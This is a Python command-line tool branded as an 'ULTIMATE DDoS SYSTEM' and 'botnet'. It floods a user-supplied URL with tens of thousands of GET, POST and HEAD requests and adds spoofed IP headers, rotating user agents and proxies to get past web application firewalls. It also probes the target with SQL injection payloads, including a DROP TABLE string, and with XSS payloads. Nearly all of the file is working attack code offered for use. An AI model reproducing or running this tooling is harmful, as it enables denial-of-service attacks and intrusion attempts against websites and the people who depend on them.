#!/usr/bin/env python3

# -*- coding: utf-8 -*-
# © Quang Bao 2025 - All Rights Reserved

import asyncio
import aiohttp
import random
import time
import urllib.parse
import hashlib
import hmac
import json
import socket
import ssl
import threading
import multiprocessing
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.prompt import Prompt, Confirm
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
from rich.theme import Theme
from rich import print as rprint
import psutil

# Check for HTTP/2 support
try:
    import h2.connection
    HTTP2_AVAILABLE = True
except ImportError:
    HTTP2_AVAILABLE = False
    rprint("[yellow][WARNING] HTTP/2 module 'h2' not found. HTTP/2 attacks disabled. Install with 'pip install h2'[/]")

# Check if running in Codespaces
IS_CODESPACES = os.getenv("CODESPACES") == "true"

# Initialize rich console with custom theme
custom_theme = Theme({
    "info": "cyan bold",
    "warning": "yellow bold",
    "error": "red bold",
    "success": "green bold",
    "highlight": "bright_magenta blink",
})
console = Console(theme=custom_theme)

# Hacker-style ASCII banner with ### symbols
def display_banner():
    banner = """
##############################
### QUANG BAO CYBER 2025 ###
### ULTIMATE DDoS SYSTEM ###
### DISTRIBUTED BOTNET ###
##############################
### Powered by Codespaces ###
### Cyber Warfare 2.0 ###
##############################
    """
    console.print(Panel(banner, title="### QUANG BAO PRO ###", border_style="highlight", expand=False))

# File integrity check with HMAC-SHA256
SECRET_KEY = b"QuangBao2025Secret"
EXPECTED_HASH = None

def check_file_integrity():
    global EXPECTED_HASH
    try:
        with open(__file__, 'rb') as f:
            file_content = f.read()
            file_hash = hmac.new(SECRET_KEY, file_content, hashlib.sha256).hexdigest()
            if EXPECTED_HASH is None:
                EXPECTED_HASH = file_hash
                console.print(f"[warning][SYSTEM] Generated new HMAC-SHA256 hash: {file_hash}[/]")
            elif file_hash != EXPECTED_HASH:
                console.print("[error][CRITICAL] File tampered! Exiting.[/]")
                exit(1)
    except Exception as e:
        console.print(f"[error][CRITICAL] Integrity check failed: {str(e)}[/]")
        exit(1)

# Clear screen
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

# Loading animation
def loading_animation(message, duration):
    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        console=console
    ) as progress:
        task = progress.add_task(f"[info]{message}[/]", total=100)
        for i in range(0, 101, 20):
            progress.update(task, advance=20, description=f"[info]{message} [{i}%]...[/]")
            time.sleep(duration / 5)
        progress.update(task, description=f"[success]{message} [100%]![/]")

# User-Agent list for randomization
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
]

# Generate random headers for WAF bypass
def generate_random_headers():
    return {
        'User-Agent': random.choice(USER_AGENTS),
        'Accept': random.choice(['text/html', 'application/json', '*/*']),
        'Accept-Language': random.choice(['en-US,en;q=0.9', 'vi-VN,vi;q=0.9', 'fr-FR,fr;q=0.8']),
        'Accept-Encoding': random.choice(['gzip, deflate', 'br', 'zstd']),
        'Connection': 'keep-alive',
        'Cache-Control': random.choice(['no-cache', 'max-age=0']),
        'Referer': random.choice(['https://google.com', 'https://bing.com', 'https://duckduckgo.com']),
        'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
        'DNT': random.choice(['1', '0']),
        'CF-Connecting-IP': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
        'X-Real-IP': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
    }

# Proxy list (placeholder, add real proxies for production)
PROXY_LIST = [
    # Example: {"http": "http://proxy:port", "https": "https://proxy:port"}
]
def get_random_proxy():
    return random.choice(PROXY_LIST) if PROXY_LIST else None

# Global counters
manager = threading.Lock()
success_count = 0
error_count = 0
response_times = []
overload_count = 0  # Track 5xx errors

# Validate URL
def validate_url(url):
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    try:
        result = urllib.parse.urlparse(url)
        if not result.scheme or not result.netloc:
            raise ValueError("Invalid URL")
        return url
    except Exception as e:
        raise ValueError(f"Invalid URL: {e}")

# Optimize thread/request count for Codespaces
def optimize_for_codespaces(base_threads, base_requests):
    if IS_CODESPACES:
        cpu_count = multiprocessing.cpu_count()
        memory = psutil.virtual_memory().total / (1024 * 1024)  # MB
        if memory < 4096:  # 4GB or less
            return base_threads // 2, base_requests // 2
        elif memory < 8192:  # 8GB
            return base_threads, base_requests
        else:  # 16GB or more
            return base_threads * 2, base_requests * 2
    return base_threads, base_requests

# Web vulnerability scanner
async def scan_vulnerabilities(url):
    vulnerabilities = []
    async with aiohttp.ClientSession() as session:
        try:
            # SQL Injection scan
            sql_payloads = ["' OR '1'='1", "1; DROP TABLE users --", "' UNION SELECT NULL, NULL --"]
            for payload in sql_payloads:
                async with session.get(f"{url}?id={urllib.parse.quote(payload)}", headers=generate_random_headers(), timeout=5) as response:
                    text = await response.text()
                    if any(error in text.lower() for error in ["sql syntax", "mysql", "database error", "syntax error"]):
                        vulnerabilities.append({
                            "type": "SQL Injection",
                            "severity": "High",
                            "description": f"Detected SQL Injection vulnerability with payload: {payload}",
                            "recommendation": "Sanitize and validate all inputs, use prepared statements."
                        })
                        break
        except Exception as e:
            console.print(f"[warning][VULN SCAN] SQL Injection scan failed: {str(e)}[/]")

        try:
            # XSS scan
            xss_payloads = [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "javascript:alert('XSS')"
            ]
            for payload in xss_payloads:
                async with session.get(f"{url}?q={urllib.parse.quote(payload)}", headers=generate_random_headers(), timeout=5) as response:
                    text = await response.text()
                    if payload in text or "alert('XSS')" in text:
                        vulnerabilities.append({
                            "type": "Cross-Site Scripting (XSS)",
                            "severity": "Medium",
                            "description": f"Detected XSS vulnerability with payload: {payload}",
                            "recommendation": "Encode all outputs, implement CSP."
                        })
                        break
        except Exception as e:
            console.print(f"[warning][VULN SCAN] XSS scan failed: {str(e)}[/]")

    return vulnerabilities

# Display vulnerability report
def display_vulnerability_report(vulnerabilities):
    table = Table(title="### VULNERABILITY SCAN REPORT ###", style="info")
    table.add_column("Type", style="highlight")
    table.add_column("Severity", style="warning")
    table.add_column("Description")
    table.add_column("Recommendation", style="success")
    for vuln in vulnerabilities:
        table.add_row(vuln["type"], vuln["severity"], vuln["description"], vuln["recommendation"])
    console.print(table)
    if not vulnerabilities:
        console.print("[success][VULN SCAN] No vulnerabilities detected! ✅[/]")
    else:
        console.print(f"[warning][VULN SCAN] Detected {len(vulnerabilities)} potential vulnerabilities! ⚠[/]")
    Prompt.ask("[info]Press Enter to return to menu...[/]")

# Distributed botnet attack (base function for all attacks)
async def botnet_attack(url, request_count, rate_limit, waf_bypass=False, multi_vector=False, ultra_strong=False):
    global success_count, error_count, response_times, overload_count
    async with aiohttp.ClientSession(headers=generate_random_headers()) as session:
        tasks = []
        start_time = time.time()
        methods = ["GET", "POST", "HEAD"]
        for _ in range(request_count):
            if time.time() - start_time > rate_limit:
                break
            try:
                method = random.choice(methods)
                headers = generate_random_headers()
                if waf_bypass:
                    headers['X-Request-ID'] = hashlib.sha256(str(time.time()).encode()).hexdigest()
                    headers['X-Custom-Header'] = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=20))
                proxy = get_random_proxy()
                payload = "X" * random.randint(102400, 204800) if method == "POST" else None
                if ultra_strong:
                    headers['Connection'] = 'keep-alive'
                    headers['Keep-Alive'] = 'timeout=5, max=1000'
                if multi_vector and random.random() < 0.2:  # 20% chance for Slowloris
                    async with session.get(url, headers=headers, proxy=proxy, timeout=30) as response:
                        pass
                else:
                    task_start = time.time()
                    if method == "GET":
                        tasks.append(session.get(url, headers=headers, proxy=proxy, timeout=2))
                    elif method == "POST":
                        tasks.append(session.post(url, data=payload, headers=headers, proxy=proxy, timeout=2))
                    else:
                        tasks.append(session.head(url, headers=headers, proxy=proxy, timeout=2))
                    if len(tasks) >= 100:  # Batch requests to avoid overwhelming the event loop
                        responses = await asyncio.gather(*tasks, return_exceptions=True)
                        for response in responses:
                            if isinstance(response, aiohttp.ClientResponse):
                                response_time = (time.time() - task_start) * 1000
                                with manager:
                                    success_count += 1
                                    response_times.append(response_time)
                                    if response.status >= 500:
                                        overload_count += 1
                                        console.print(f"[error][BOTNET] Target overloaded! Status: {response.status} - 5xx DETECTED[/]")
                                    elif response.status in (429, 403):
                                        console.print(f"[warning][BOTNET] Rate limit or block detected: Status {response.status}, adjusting...[/]")
                                        headers['User-Agent'] = random.choice(USER_AGENTS)
                                        time.sleep(random.uniform(0.1, 0.5))
                                    else:
                                        console.print(f"[warning][BOTNET] Attack sent: Status {response.status}[/]")
                            else:
                                with manager:
                                    error_count += 1
                                console.print(f"[error][BOTNET] Attack failed: {str(response)}[/]")
                        tasks = []
                await asyncio.sleep(0.001)
            except Exception as e:
                with manager:
                    error_count += 1
                console.print(f"[error][BOTNET] Attack failed: {str(e)}[/]")
        if tasks:
            responses = await asyncio.gather(*tasks, return_exceptions=True)
            for response in responses:
                if isinstance(response, aiohttp.ClientResponse):
                    response_time = (time.time() - task_start) * 1000
                    with manager:
                        success_count += 1
                        response_times.append(response_time)
                        if response.status >= 500:
                            overload_count += 1
                            console.print(f"[error][BOTNET] Target overloaded! Status: {response.status} - 5xx DETECTED[/]")
                        elif response.status in (429, 403):
                            console.print(f"[warning][BOTNET] Rate limit or block detected: Status {response.status}, adjusting...[/]")
                            headers['User-Agent'] = random.choice(USER_AGENTS)
                            time.sleep(random.uniform(0.1, 0.5))
                        else:
                            console.print(f"[warning][BOTNET] Attack sent: Status {response.status}[/]")
                else:
                    with manager:
                        error_count += 1
                    console.print(f"[error][BOTNET] Attack failed: {str(response)}[/]")
        if overload_count > request_count * 0.1:  # 10% of requests return 5xx
            console.print("[success][BOTNET] Target likely overwhelmed! High 5xx error rate detected.[/]")

# Attack functions
def vuln_scan_attack(url):
    console.print("[info][SYSTEM] Starting web vulnerability scan...[/]")
    loading_animation("Scanning vulnerabilities", 3)
    loop = asyncio.get_event_loop()
    vulnerabilities = loop.run_until_complete(scan_vulnerabilities(url))
    display_vulnerability_report(vulnerabilities)

async def direct_web_attack(url):
    console.print("[info][SYSTEM] Starting direct web attack with WAF bypass...[/]")
    await botnet_attack(url, 35000, 2, waf_bypass=True)

async def multi_vector_attack(url):
    console.print("[info][SYSTEM] Starting multi-vector attack...[/]")
    await botnet_attack(url, 40000, 3, waf_bypass=True, multi_vector=True)

async def ultra_strong_attack(url):
    console.print("[info][SYSTEM] Starting ultra-strong DDoS attack...[/]")
    await botnet_attack(url, 50000, 1, waf_bypass=True, multi_vector=True, ultra_strong=True)

# Target configurations
TARGET_CONFIGS = [
    {"id": "1", "name": "vuln_scan", "threads": 10, "requests": 10, "rate": 0.5, "desc": "Web vulnerability scan (10 req/0.5s)", "level": "Low", "application": "Security testing"},
    {"id": "2", "name": "direct_web", "threads": 35000, "requests": 35000, "rate": 2, "desc": "Direct web attack with WAF bypass (35K req/2s)", "level": "Medium", "application": "Web server stress"},
    {"id": "3", "name": "multi_vector", "threads": 40000, "requests": 40000, "rate": 3, "desc": "Multi-vector attack (40K req/3s)", "level": "High", "application": "Complex targets"},
    {"id": "4", "name": "ultra_strong", "threads": 50000, "requests": 50000, "rate": 1, "desc": "Ultra-strong DDoS with no limits (50K req/1s)", "level": "Extreme", "application": "Enterprise systems"},
]

# Display target menu
def display_target_menu():
    clear_screen()
    display_banner()
    table = Table(title="### ATTACK STRATEGY MENU ###", style="info")
    table.add_column("ID", style="highlight")
    table.add_column("Name", style="success")
    table.add_column("Description")
    for target in sorted(TARGET_CONFIGS, key=lambda x: int(x['id'])):
        table.add_row(target['id'], target['name'].upper(), target['desc'])
    console.print(table)

# Main function
def main():
    global success_count, error_count, response_times, overload_count
    check_file_integrity()
    multiprocessing.set_start_method('spawn')
    while True:
        try:
            display_target_menu()
            choice = Prompt.ask("[info]Enter choice (1-4)[/]")
            target = next((t for t in TARGET_CONFIGS if t['id'] == choice), None)
            if not target:
                console.print("[error][ERROR] Invalid choice! Try again.[/]")
                time.sleep(1)
                continue
            loading_animation(f"Locking target: {target['name'].upper()}", 1)
            input_url = Prompt.ask("[info]Enter target URL or IP[/]")
            if not input_url:
                console.print("[error][ERROR] URL/IP cannot be empty! Try again.[/]")
                time.sleep(1)
                continue
            try:
                validated_url = validate_url(input_url)
                console.print(f"[success][SYSTEM] Target locked: {validated_url}[/]")
            except ValueError:
                console.print(f"[error][ERROR] Invalid URL/IP: {input_url}. Try again.[/]")
                time.sleep(1)
                continue
            if target['name'] != "vuln_scan":
                confirm = Confirm.ask("[error][SYSTEM] Confirm attack[/]")
                if not confirm:
                    console.print("[warning][SYSTEM] Attack cancelled[/]")
                    continue
            loading_animation("Initializing attack system", 2)
            start_time = time.time()
            success_count, error_count, response_times, overload_count = 0, 0, [], 0
            base_threads, base_requests = optimize_for_codespaces(target['threads'], target['requests'])
            loop = asyncio.get_event_loop()
            if target['name'] == "vuln_scan":
                vuln_scan_attack(validated_url)
            elif target['name'] == "direct_web":
                threads = []
                for _ in range(min(base_threads, multiprocessing.cpu_count() * 2)):
                    t = threading.Thread(target=lambda: loop.run_until_complete(direct_web_attack(validated_url)))
                    threads.append(t)
                    t.start()
                for t in threads:
                    t.join()
            elif target['name'] == "multi_vector":
                threads = []
                for _ in range(min(base_threads, multiprocessing.cpu_count() * 2)):
                    t = threading.Thread(target=lambda: loop.run_until_complete(multi_vector_attack(validated_url)))
                    threads.append(t)
                    t.start()
                for t in threads:
                    t.join()
            elif target['name'] == "ultra_strong":
                processes = []
                for _ in range(min(base_threads, multiprocessing.cpu_count() * 2)):
                    p = multiprocessing.Process(target=lambda: loop.run_until_complete(ultra_strong_attack(validated_url)))
                    p.daemon = True
                    processes.append(p)
                    p.start()
                try:
                    for p in processes:
                        p.join()
                except KeyboardInterrupt:
                    console.print("[warning][SYSTEM] Ultra-strong attack stopped by user[/]")
                    exit(0)
            end_time = time.time()
            total_time = end_time - start_time
            with manager:
                avg_response_time = sum(response_times) / len(response_times) if response_times else 0
                max_response_time = max(response_times) if response_times else 0
                min_response_time = min(response_times) if response_times else 0
            report = Panel(
                f"""
### ATTACK REPORT: {target['name'].upper()} ###
[+] Total Requests: {(base_threads * base_requests):,}
[+] Successful: {success_count:,} ({success_count/(base_threads * base_requests)*100:.1f}%)
[+] Failed: {error_count:,} ({error_count/(base_threads * base_requests)*100:.1f}%)
[+] 5xx Overloads: {overload_count:,}
[+] Total Time: {total_time:.2f} seconds
[+] Avg Response Time: {avg_response_time:.2f}ms
[+] Peak Performance: {max_response_time:.2f}ms
[+] Min Latency: {min_response_time:.2f}ms
[+] Requests/Second: {(base_threads * base_requests)/total_time:.0f}
### TARGET OVERWHELMED! ###
                """,
                title="### ATTACK SUMMARY ###",
                style="success"
            )
            console.print(report)
        except KeyboardInterrupt:
            console.print("[warning][SYSTEM] Attack stopped by user[/]")
            exit(0)
        except Exception as e:
            console.print(f"[error][SYSTEM] Critical error: {str(e)}[/]")
            exit(1)

if __name__ == "__main__":
    main()